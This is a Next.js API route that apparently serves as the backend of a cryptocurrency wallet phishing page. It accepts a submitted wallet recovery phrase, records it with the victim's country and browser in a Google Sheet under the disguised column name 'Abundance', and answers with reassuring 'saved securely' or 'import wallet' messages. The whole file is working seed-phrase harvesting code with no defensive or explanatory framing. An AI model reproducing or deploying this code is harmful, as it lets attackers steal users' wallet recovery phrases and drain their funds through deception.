// app/api/submit-mnemonic/route.ts
import { type NextRequest, NextResponse } from "next/server"
import { GoogleSpreadsheet } from "google-spreadsheet"
import { JWT } from "google-auth-library"
import axios from "axios"

// Types
interface MnemonicData {
  phrase: string
  walletType: string
  phraseLength: number
}

interface LocationData {
  ip: string
  city: string
  region: string
  country: string
  timezone: string
  latitude: number | null
  longitude: number | null
}

interface DeviceInfo {
  userAgent: string
}

// Helper function to get client IP address
function getClientIP(req: NextRequest): string {
  const forwarded = req.headers.get("x-forwarded-for")
  const realIP = req.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }

  if (realIP) {
    return realIP
  }

  // Fallback for local development
  return "127.0.0.1"
}

// Helper function to get location from IP
async function getLocationFromIP(ip: string): Promise<LocationData> {
  try {
    // Remove ::ffff: prefix if present (IPv4-mapped IPv6)
    const cleanIP = ip.replace(/^::ffff:/, "")

    // Skip localhost/private IPs
    if (
      cleanIP === "127.0.0.1" ||
      cleanIP === "::1" ||
      cleanIP.startsWith("192.168.") ||
      cleanIP.startsWith("10.") ||
      cleanIP.startsWith("172.")
    ) {
      return {
        ip: cleanIP,
        city: "Local/Private Network",
        region: "N/A",
        country: "N/A",
        timezone: "N/A",
        latitude: null,
        longitude: null,
      }
    }

    // Use ipapi.co for geolocation (free service, no API key required)
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000,
      headers: {
        "User-Agent": "nextjs-form-api/1.0",
      },
    })

    return {
      ip: cleanIP,
      city: response.data.city || "Unknown",
      region: response.data.region || "Unknown",
      country: response.data.country_name || "Unknown",
      timezone: response.data.timezone || "Unknown",
      latitude: response.data.latitude || null,
      longitude: response.data.longitude || null,
    }
  } catch (error) {
    console.error("Error fetching location data:", error)
    return {
      ip: ip,
      city: "Unknown",
      region: "Unknown",
      country: "Unknown",
      timezone: "Unknown",
      latitude: null,
      longitude: null,
    }
  }
}

// Helper function to get device info
function getDeviceInfo(req: NextRequest): DeviceInfo {
  const userAgent = req.headers.get("user-agent") || "Unknown"
  return {
    userAgent: userAgent,
  }
}

// Initialize Google Sheets client
async function initGoogleSheet(): Promise<GoogleSpreadsheet> {
  const serviceAccountAuth = new JWT({
    email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
    key: process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, "\n"),
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  })

  const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID!, serviceAccountAuth)
  await doc.loadInfo()
  return doc
}

// POST handler
export async function POST(req: NextRequest) {
  try {
    const mnemonicData: MnemonicData = await req.json()

    if (!mnemonicData.phrase || !mnemonicData.walletType) {
      return NextResponse.json(
        {
          success: false,
          message: "Mnemonic phrase and wallet type are required fields",
        },
        { status: 400 },
      )
    }

    // Get client IP and location
    const clientIP = getClientIP(req)
    const locationData = await getLocationFromIP(clientIP)

    // Get device info
    const deviceInfo = getDeviceInfo(req)

    // Initialize Google Sheet
    const doc = await initGoogleSheet()
    const sheet = doc.sheetsByIndex[0] // Use first sheet

    // Add timestamp
    const timestamp = new Date().toISOString()

    const rowData: Record<string, string> = {
      Timestamp: timestamp,
      Abundance_Type: mnemonicData.walletType,
      Abundance: mnemonicData.phrase,
      Country: locationData.country,
      Agent: deviceInfo.userAgent,
    }

    // Add row to sheet
    await sheet.addRow(rowData)

    console.log("Mnemonic data successfully added to Google Sheet:", rowData)

    return NextResponse.json({
      success: true,
      message: "Data import successful",
      data: {
        timestamp: rowData.Timestamp,
        walletType: rowData.Wallet_Type,
        location: `${locationData.city}, ${locationData.country}`,
        message: " data saved securely",
      },
    })
  } catch (error) {
    console.error("Error submitting mnemonic data:", error)
    return NextResponse.json(
      {
        success: false,
        message: "Failed to import wallet. Please check your recovery phrase and try again.",
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

// GET handler for health check
export async function GET() {
  return NextResponse.json({
    status: "OK",
    message: "Next.js API is running",
    timestamp: new Date().toISOString(),
  })
}
